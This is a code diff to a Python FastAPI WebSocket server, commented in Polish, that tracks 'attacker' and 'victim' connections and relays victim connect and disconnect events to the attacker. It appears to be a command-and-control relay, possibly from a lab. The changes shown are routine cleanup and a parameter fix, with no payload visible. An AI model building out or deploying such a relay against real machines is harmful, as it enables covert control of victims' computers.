@@ -1,10 +1,6 @@
-import os
 import json
-import asyncio
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
 from fastapi.responses import PlainTextResponse
-from starlette.websockets import WebSocketState
-import uvicorn
 
 # Przechowujemy połączenia wg roli: "attacker" i "victim"
 victims: dict[str, WebSocket] = {}
@@ -134,11 +130,11 @@ async def attacker_endpoint(ws: WebSocket):
 
 
 @app.websocket("/victim")
-async def victim_endpoint(ws: WebSocket, id: str = Query(default=None)):
+async def victim_endpoint(ws: WebSocket, victim_id_query: str | None = Query(default=None, alias="id")):
     """WebSocket endpoint dla victima (/victim?id=...)."""
     await ws.accept()
 
-    victim_id = id or f"victim-{id(ws)}"
+    victim_id = victim_id_query or f"victim-{id(ws)}"
     victims[victim_id] = ws
     print(f"[+] Victim połączony: {victim_id} (aktywnych: {len(victims)})")
 
@@ -179,9 +175,3 @@ async def victim_endpoint(ws: WebSocket, id: str = Query(default=None)):
         victims.pop(victim_id, None)
         print(f"[-] Victim rozłączony: {victim_id} (aktywnych: {len(victims)})")
         await notify_attacker({"type": "victim_disconnected", "id": victim_id})
-
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8765))
-    print(f"Serwer startuje na 0.0.0.0:{port}")
-    uvicorn.run(app, host="0.0.0.0", port=port)
